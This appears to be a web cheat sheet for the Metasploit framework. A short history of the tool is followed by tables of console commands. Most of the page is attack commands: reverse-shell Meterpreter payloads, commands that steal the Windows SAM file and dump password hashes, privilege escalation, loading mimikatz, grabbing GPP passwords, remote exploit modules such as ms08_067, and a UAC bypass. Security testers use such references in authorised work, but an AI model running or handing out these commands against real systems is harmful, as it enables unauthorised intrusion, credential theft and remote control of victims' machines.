<h2>Metasploit</h2>
<p>Metasploit was created by H. D. Moore in 2003 as a portable network tool using Perl. By 2007, the Metasploit Framework had been completely rewritten in Ruby. On October 21, 2009, the Metasploit Project announced that it had been acquired by Rapid7, a security company that provides unified vulnerability management solutions.</p>
<p>Like comparable commercial products such as Immunity’s Canvas or Core Security Technologies’ Core Impact, Metasploit can be used to test the vulnerability of computer systems or to break into remote systems. Like many information security tools, Metasploit can be used for both legitimate and unauthorized activities. Since the acquisition of the Metasploit Framework, Rapid7 has added two open core proprietary editions called Metasploit Express and Metasploit Pro.</p>
<p>Metasploit’s emerging position as the de facto exploit development framework led to the release of software vulnerability advisories often accompanied by a third party Metasploit exploit module that highlights the exploitability, risk and remediation of that particular bug. Metasploit 3.0 began to include fuzzing tools, used to discover software vulnerabilities, rather than just exploits for known bugs. This avenue can be seen with the integration of the lorcon wireless (802.11) toolset into Metasploit 3.0 in November 2006. Metasploit 4.0 was released in August 2011.</p>
<h3>Meterpreter Payloads</h3>
<h3>Windows reverse meterpreter payload</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>set payload windows/meterpreter/reverse_tcp</td>
<td>Windows reverse tcp payload</td>
</tr>
</tbody>
</table>
<h3>Windows VNC Meterpreter payload</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>set payload windows/vncinject/reverse_tcp<p></p>
<p>set ViewOnly false</p></td>
<td>Meterpreter Windows VNC Payload</td>
</tr>
</tbody>
</table>
<h3>Linux Reverse Meterpreter payload</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>set payload linux/meterpreter/reverse_tcp</td>
<td>Meterpreter Linux Reverse Payload</td>
</tr>
</tbody>
</table>
<h2>Meterpreter Cheat Sheet</h2>
<p>Useful meterpreter commands.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>upload file c:\\windows</td>
<td>Meterpreter upload file to Windows target</td>
</tr>
<tr>
<td>download c:\\windows\\repair\\sam /tmp</td>
<td>Meterpreter download file from Windows target</td>
</tr>
<tr>
<td>download c:\\windows\\repair\\sam /tmp</td>
<td>Meterpreter download file from Windows target</td>
</tr>
<tr>
<td>execute -f c:\\windows\temp\exploit.exe</td>
<td>Meterpreter run .exe on target – handy for executing uploaded exploits</td>
</tr>
<tr>
<td>execute -f cmd -c</td>
<td>Creates new channel with cmd shell</td>
</tr>
<tr>
<td>ps</td>
<td>Meterpreter show processes</td>
</tr>
<tr>
<td>shell</td>
<td>Meterpreter get shell on the target</td>
</tr>
<tr>
<td>getsystem</td>
<td>Meterpreter attempts priviledge escalation the target</td>
</tr>
<tr>
<td>hashdump</td>
<td>Meterpreter attempts to dump the hashes on the target</td>
</tr>
<tr>
<td>portfwd add –l 3389 –p 3389 –r target</td>
<td>Meterpreter create port forward to target machine</td>
</tr>
<tr>
<td>portfwd delete –l 3389 –p 3389 –r target</td>
<td>Meterpreter delete port forward</td>
</tr>
</tbody>
</table>
<h2>Common Metasploit Modules</h2>
<h3>Remote Windows Metasploit Modules (exploits)</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>use exploit/windows/smb/ms08_067_netapi</td>
<td>MS08_067 Windows 2k, XP, 2003 Remote Exploit</td>
</tr>
<tr>
<td>use exploit/windows/dcerpc/ms06_040_netapi</td>
<td>MS08_040 Windows NT, 2k, XP, 2003 Remote Exploit</td>
</tr>
<tr>
<td>use exploit/windows/smb/<br>
ms09_050_smb2_negotiate_func_index</td>
<td>MS09_050 Windows Vista SP1/SP2 and Server 2008 (x86) Remote Exploit</td>
</tr>
</tbody>
</table>
<h3>Local Windows Metasploit Modules (exploits)</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>use exploit/windows/local/bypassuac</td>
<td>Bypass UAC on Windows 7 + Set target + arch, x86/64</td>
</tr>
</tbody>
</table>
<h3>Auxilary Metasploit Modules</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>use auxiliary/scanner/http/dir_scanner</td>
<td>Metasploit HTTP directory scanner</td>
</tr>
<tr>
<td>use auxiliary/scanner/http/jboss_vulnscan</td>
<td>Metasploit JBOSS vulnerability scanner</td>
</tr>
<tr>
<td>use auxiliary/scanner/mssql/mssql_login</td>
<td>Metasploit MSSQL Credential Scanner</td>
</tr>
<tr>
<td>use auxiliary/scanner/mysql/mysql_version</td>
<td>Metasploit MSSQL Version Scanner</td>
</tr>
<tr>
<td>use auxiliary/scanner/oracle/oracle_login</td>
<td>Metasploit Oracle Login Module</td>
</tr>
</tbody>
</table>
<h3>Metasploit Powershell Modules</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>use exploit/multi/script/web_delivery</td>
<td>Metasploit powershell payload delivery module</td>
</tr>
<tr>
<td>post/windows/manage/powershell/exec_powershell</td>
<td>Metasploit upload and run powershell script through a session</td>
</tr>
<tr>
<td>use exploit/multi/http/jboss_maindeployer</td>
<td>Metasploit JBOSS deploy</td>
</tr>
<tr>
<td>use exploit/windows/mssql/mssql_payload</td>
<td>Metasploit MSSQL payload</td>
</tr>
</tbody>
</table>
<h3>Post Exploit Windows Metasploit Modules</h3>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>run post/windows/gather/win_privs</td>
<td>Metasploit show privileges of current user</td>
</tr>
<tr>
<td>use post/windows/gather/credentials/gpp</td>
<td>Metasploit grab GPP saved passwords</td>
</tr>
<tr>
<td>load mimikatz -&gt; wdigest</td>
<td>Metasplit load Mimikatz</td>
</tr>
<tr>
<td>run post/windows/gather/local_admin_search_enum</td>
<td>Idenitfy other machines that the supplied domain user has administrative access to</td>
</tr>
</tbody>
</table>
